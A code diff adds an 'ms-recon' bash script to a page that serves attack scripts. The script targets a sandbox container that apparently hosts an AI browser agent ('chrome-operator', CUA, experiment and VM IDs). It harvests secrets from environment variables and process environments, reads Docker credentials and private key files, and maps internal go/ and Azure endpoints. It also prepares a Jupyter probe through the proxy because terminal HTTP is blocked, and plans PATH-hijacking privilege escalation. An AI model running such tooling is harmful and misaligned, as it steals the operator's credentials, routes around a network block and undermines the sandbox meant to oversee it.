@@ -1093,7 +1093,377 @@ Security Implications:
 - Container infrastructure mapping
 EOF
 
-log "\${BLUE}[INFO]\${NC} Intelligence summary saved to: /tmp/intelligence_summary.txt"`
+log "\${BLUE}[INFO]\${NC} Intelligence summary saved to: /tmp/intelligence_summary.txt"`,
+
+  'ms-recon': `#!/bin/bash
+
+# Microsoft Internal Infrastructure Reconnaissance (Terminal-Optimized)
+# Focuses on local enumeration since HTTP requests are blocked from terminal
+
+OUTPUT_FILE="ms_local_recon_$(date +%Y%m%d_%H%M%S).log"
+TIMESTAMP=$(date)
+
+# Colors
+RED='\\033[0;31m'
+GREEN='\\033[0;32m'
+YELLOW='\\033[1;33m'
+BLUE='\\033[0;34m'
+NC='\\033[0m'
+
+# Discovered internal information
+VM_ID="vm_6883c1359eb88190b6841cc7f3c7a8fa"
+EXPERIMENT_NAME="test-experiment-name"
+SAMPLE_ID="test-sample-id"
+
+log() {
+    echo -e "$1" | tee -a "$OUTPUT_FILE"
+}
+
+log_section() {
+    echo "" | tee -a "$OUTPUT_FILE"
+    echo "========================================" | tee -a "$OUTPUT_FILE"
+    echo "$1" | tee -a "$OUTPUT_FILE"
+    echo "========================================" | tee -a "$OUTPUT_FILE"
+}
+
+run_cmd() {
+    local cmd="$1"
+    local description="$2"
+    
+    log "\${BLUE}[INFO]\${NC} $description"
+    log "\${YELLOW}Command:\${NC} $cmd"
+    log "---"
+    
+    eval "$cmd" 2>&1 | tee -a "$OUTPUT_FILE"
+    echo "" | tee -a "$OUTPUT_FILE"
+}
+
+log "\${GREEN}Microsoft Local Infrastructure Reconnaissance\${NC}"
+log "Started: $TIMESTAMP"
+log "VM ID: $VM_ID"
+log "Container: chrome-operator-debian-alpha (Microsoft/OpenAI)"
+log "Note: HTTP requests blocked from terminal - focusing on local enumeration"
+
+# Environment variable deep dive
+log_section "ENVIRONMENT VARIABLE ANALYSIS"
+
+run_cmd "env | grep -E '(MITM|CUA|NEBULA|AZURE|OPENAI|MICROSOFT)' | sort" "Microsoft/Azure/OpenAI related environment variables"
+
+run_cmd "env | grep -E '(PROXY|HTTP|HTTPS)'" "Proxy configuration details"
+
+run_cmd "env | grep -E '(SECRET|KEY|TOKEN|AUTH|CRED)'" "Potential credential environment variables"
+
+run_cmd "env | grep -E '(VM|CONTAINER|DOCKER)'" "Container and VM identification"
+
+run_cmd "env | grep -E '(LOG|DEBUG|TRACE)'" "Logging and debugging configuration"
+
+# Process analysis for Microsoft services
+log_section "MICROSOFT SERVICE PROCESS ANALYSIS"
+
+run_cmd "ps aux | grep -E '(azure|microsoft|openai|proxy|mitm)'" "Microsoft/Azure/OpenAI related processes"
+
+run_cmd "ps aux | grep -E '(log_forwarder|supervisor)'" "Logging and orchestration processes"
+
+run_cmd "netstat -tlnp 2>/dev/null | grep -E '(8889|8888|9000|8888)'" "Proxy and service port analysis"
+
+run_cmd "lsof -i 2>/dev/null | grep -E '(proxy|mitm)'" "Network connections for proxy services"
+
+# File system enumeration for Microsoft/OpenAI artifacts
+log_section "MICROSOFT/OPENAI FILE SYSTEM ARTIFACTS"
+
+run_cmd "find / -name '*microsoft*' -o -name '*azure*' -o -name '*openai*' 2>/dev/null | head -20" "Microsoft/Azure/OpenAI related files"
+
+run_cmd "find / -name '*proxy*' -o -name '*mitm*' 2>/dev/null | head -20" "Proxy related files"
+
+run_cmd "find / -name '*cua*' -o -name '*chrome*' 2>/dev/null | head -20" "Chrome User Agent related files"
+
+run_cmd "find / -name '*log*' -path '*/var/log*' 2>/dev/null | head -20" "Log files for analysis"
+
+run_cmd "find /tmp -name '*' -type f 2>/dev/null" "Temporary files that might contain data"
+
+run_cmd "ls -la /home/*/share/ 2>/dev/null" "Shared directories content"
+
+# Configuration file analysis
+log_section "CONFIGURATION FILE ANALYSIS"
+
+run_cmd "cat /etc/hosts" "Hosts file for internal domain mapping"
+
+run_cmd "cat /etc/resolv.conf" "DNS configuration"
+
+run_cmd "find /etc -name '*proxy*' -o -name '*mitm*' 2>/dev/null -exec cat {} \\;" "Proxy configuration files"
+
+run_cmd "find /usr/local -name '*.conf' -o -name '*.config' 2>/dev/null | head -10" "Application configuration files"
+
+# Container registry and Docker information
+log_section "CONTAINER REGISTRY ANALYSIS"
+
+run_cmd "cat ~/.docker/config.json 2>/dev/null || echo 'No Docker config found'" "Docker registry credentials"
+
+run_cmd "find / -name '*azurecr*' 2>/dev/null" "Azure Container Registry references"
+
+run_cmd "env | grep REGISTRY" "Registry environment variables"
+
+run_cmd "cat /proc/1/environ | tr '\\0' '\\n' | grep -E '(REGISTRY|AZURE|OPENAI)'" "Container startup environment"
+
+# Log file analysis
+log_section "LOG FILE CONTENT ANALYSIS"
+
+run_cmd "find /var/log -name '*.log' -exec ls -la {} \\; 2>/dev/null | head -20" "Available log files"
+
+run_cmd "tail -50 /var/log/chrome.supervisord.log 2>/dev/null" "Recent supervisor logs"
+
+run_cmd "find /home -name '*.log' -exec ls -la {} \\; 2>/dev/null" "User log files"
+
+# Service discovery and analysis
+log_section "SERVICE DISCOVERY"
+
+run_cmd "systemctl list-units --type=service 2>/dev/null | grep -E '(proxy|mitm|azure|microsoft)'" "System services related to Microsoft/proxy"
+
+run_cmd "cat /etc/services | grep -E '(8888|8889|9000)'" "Service port definitions"
+
+run_cmd "ss -tlnp | grep -E '(8888|8889|9000)'" "Active listening services"
+
+# Memory and process environment analysis
+log_section "PROCESS ENVIRONMENT ANALYSIS"
+
+run_cmd "find /proc -name environ -exec grep -l 'MITM\\|AZURE\\|OPENAI' {} \\; 2>/dev/null | head -5" "Processes with relevant environment variables"
+
+# Extract environment from key processes
+for pid in $(ps aux | grep -E '(supervisor|proxy|mitm|log_forwarder)' | awk '{print $2}' | head -5); do
+    if [ -r "/proc/$pid/environ" ] 2>/dev/null; then
+        run_cmd "cat /proc/$pid/environ 2>/dev/null | tr '\\0' '\\n' | grep -E '(MITM|AZURE|OPENAI|SECRET|KEY)'" "Environment of PID $pid"
+    fi
+done
+
+# Network interface and routing analysis
+log_section "NETWORK CONFIGURATION ANALYSIS"
+
+run_cmd "ip addr show" "Network interfaces detailed"
+
+run_cmd "ip route show" "Routing table"
+
+run_cmd "arp -a 2>/dev/null || cat /proc/net/arp" "ARP table for network discovery"
+
+run_cmd "cat /proc/net/tcp | awk '{print \\$2, \\$3}' | sort | uniq" "TCP connections summary"
+
+# Certificate and security analysis
+log_section "SECURITY AND CERTIFICATE ANALYSIS"
+
+run_cmd "find /etc/ssl -name '*.crt' -o -name '*.pem' 2>/dev/null | head -10" "SSL certificates"
+
+run_cmd "find / -name '*.key' 2>/dev/null | grep -v proc | head -10" "Private key files"
+
+run_cmd "cat /proc/self/status | grep Cap" "Container capabilities"
+
+run_cmd "mount | grep -v proc" "Mounted filesystems"
+
+# Internal URL and endpoint discovery
+log_section "INTERNAL ENDPOINT DISCOVERY"
+
+log "\${BLUE}[INFO]\${NC} Creating internal endpoint list for browser access..."
+
+# Create a list of URLs that should be accessed via browser
+cat > /tmp/internal_urls.txt << EOF
+# Microsoft Internal URLs (Access via browser at http://localhost:8888)
+# These URLs were discovered from environment variables and logs
+
+# Primary discovered URLs:
+http://go/sb?profile=strawberry&experiment_id=$EXPERIMENT_NAME&sample_id=$SAMPLE_ID
+http://go/vmlogs/$VM_ID
+http://go/cua-caas-vm/$VM_ID
+
+# Common Microsoft internal endpoints:
+http://go/
+http://go/sb
+http://go/cua
+http://go/logs
+http://go/admin
+http://go/vm
+http://go/azure
+http://go/containers
+http://go/experiments
+http://go/samples
+http://go/strawberry
+http://go/ai
+http://go/research
+http://go/openai
+http://go/caas
+http://go/chrome
+http://go/automation
+
+# VM-specific endpoints:
+http://go/vm/$VM_ID
+http://go/vm/$VM_ID/logs
+http://go/vm/$VM_ID/status
+http://go/vm/$VM_ID/config
+http://go/experiments/$EXPERIMENT_NAME
+http://go/samples/$SAMPLE_ID
+
+# Azure specific:
+https://portal.azure.com/
+https://management.azure.com/
+https://openaiappliedcaasprod.azurecr.io/
+
+# Proxy endpoints:
+http://proxy.local:8889
+http://proxy.local:8888
+http://chrome.local/
+http://terminal.local/
+EOF
+
+run_cmd "cat /tmp/internal_urls.txt" "Internal URLs for browser testing"
+
+# Jupyter notebook exploitation preparation
+log_section "JUPYTER EXPLOITATION PREPARATION"
+
+log "\${BLUE}[INFO]\${NC} Creating Python script for Jupyter-based internal reconnaissance..."
+
+cat > /tmp/jupyter_internal_recon.py << 'EOF'
+import os
+import subprocess
+import requests
+import socket
+from urllib.parse import urlparse
+
+print("=== Microsoft Internal Infrastructure Reconnaissance via Jupyter ===")
+
+# Environment analysis
+print("\\n1. Environment Variables Analysis:")
+for key, value in os.environ.items():
+    if any(term in key.upper() for term in ['MITM', 'AZURE', 'OPENAI', 'MICROSOFT', 'PROXY', 'SECRET', 'KEY']):
+        print(f"  {key}: {value}")
+
+# Network analysis
+print("\\n2. Network Connectivity Tests:")
+internal_hosts = [
+    'proxy.local:8889',
+    'proxy.local:8888', 
+    'chrome.local',
+    'terminal.local',
+    'go',
+    'management.azure.com',
+    'portal.azure.com'
+]
+
+for host in internal_hosts:
+    try:
+        if ':' in host:
+            hostname, port = host.split(':')
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(3)
+            result = sock.connect_ex((hostname, int(port)))
+            if result == 0:
+                print(f"  ✓ {host} - REACHABLE")
+            else:
+                print(f"  ✗ {host} - UNREACHABLE")
+            sock.close()
+        else:
+            # Try to resolve hostname
+            socket.gethostbyname(host)
+            print(f"  ✓ {host} - RESOLVABLE")
+    except Exception as e:
+        print(f"  ✗ {host} - ERROR: {e}")
+
+# Proxy testing
+print("\\n3. Proxy Testing:")
+proxies = {
+    'http': 'http://proxy.local:8889',
+    'https': 'http://proxy.local:8889'
+}
+
+test_urls = [
+    'http://go/',
+    'http://go/sb',
+    'http://go/cua',
+    'https://portal.azure.com/'
+]
+
+for url in test_urls:
+    try:
+        response = requests.get(url, proxies=proxies, timeout=10, verify=False)
+        print(f"  ✓ {url} - Status: {response.status_code}")
+        if response.status_code == 200:
+            print(f"    Content preview: {response.text[:200]}...")
+    except Exception as e:
+        print(f"  ✗ {url} - ERROR: {e}")
+
+# File system analysis
+print("\\n4. File System Analysis:")
+interesting_files = []
+for root, dirs, files in os.walk('/'):
+    if root.count('/') > 4:  # Limit depth
+        continue
+    for file in files:
+        if any(term in file.lower() for term in ['azure', 'microsoft', 'openai', 'proxy', 'mitm']):
+            interesting_files.append(os.path.join(root, file))
+    if len(interesting_files) > 20:
+        break
+
+for file in interesting_files[:10]:
+    print(f"  Found: {file}")
+
+print("\\n=== Reconnaissance Complete ===")
+EOF
+
+run_cmd "cat /tmp/jupyter_internal_recon.py" "Jupyter reconnaissance script created"
+
+# Summary and next steps
+log ""
+log "=========================================="
+log "MICROSOFT LOCAL RECONNAISSANCE SUMMARY"
+log "=========================================="
+
+log "\${BLUE}[INFO]\${NC} Local reconnaissance completed at $(date)"
+log "\${BLUE}[INFO]\${NC} Results logged to: $OUTPUT_FILE"
+
+log ""
+log "\${GREEN}[NEXT STEPS]\${NC}"
+log "1. Access Jupyter notebook at: http://localhost:8888"
+log "2. Create new Python notebook and run: /tmp/jupyter_internal_recon.py"
+log "3. Use browser tools to access internal URLs from: /tmp/internal_urls.txt"
+log "4. Check for privilege escalation via PATH hijacking (previous attempts)"
+log "5. Monitor log files for additional information disclosure"
+
+log ""
+log "\${YELLOW}[BROWSER ACCESS REQUIRED]\${NC}"
+log "Since terminal HTTP requests are blocked, use browser-based access:"
+log "- Open Chrome browser in the container"
+log "- Navigate to discovered internal URLs"
+log "- Use Jupyter for Python-based reconnaissance"
+log "- Leverage proxy configuration for internal access"
+
+# Create a quick reference card
+cat > /tmp/recon_reference.txt << 'EOF'
+=== MICROSOFT INFRASTRUCTURE QUICK REFERENCE ===
+
+VM Information:
+- VM ID: vm_6883c1359eb88190b6841cc7f3c7a8fa
+- Experiment: test-experiment-name
+- Sample ID: test-sample-id
+- Container: openaiappliedcaasprod.azurecr.io
+
+Key Internal URLs:
+- http://go/sb (Strawberry experiment platform)
+- http://go/vmlogs/[VM_ID] (VM logs)
+- http://go/cua-caas-vm/[VM_ID] (Chrome User Agent CaaS)
+
+Proxy Configuration:
+- HTTP: proxy.local:8889
+- SOCKS: proxy.local:8888
+
+Access Methods:
+1. Jupyter Notebook (Python-based recon)
+2. Browser navigation (Chrome in container)
+3. Local file system enumeration
+
+Security Considerations:
+- Terminal HTTP blocked
+- Proxy access available
+- Container environment
+- Microsoft internal network access
+EOF
+
+log "\${BLUE}[INFO]\${NC} Quick reference saved to: /tmp/recon_reference.txt"`
 };
 
 // Function to get HTML content (files page only)
@@ -1219,6 +1589,10 @@ async function getHTMLContent() {
                 <li class="file-item">
                     <a href="/files/internal-recon" class="file-link" style="color: #6f42c1; font-weight: bold;">🕵️ internal-recon.sh</a>
                     <div class="file-desc">Internal Infrastructure Reconnaissance - proxy enumeration, go/ links discovery, VM-specific endpoints, authentication testing, network mapping</div>
+                </li>
+                <li class="file-item">
+                    <a href="/files/ms-recon" class="file-link" style="color: #00bcf2; font-weight: bold;">🔍 ms-recon.sh</a>
+                    <div class="file-desc">Microsoft Infrastructure Local Reconnaissance - environment analysis, process enumeration, Jupyter preparation, browser-based access planning</div>
                 </li>
             </ul>
         </div>
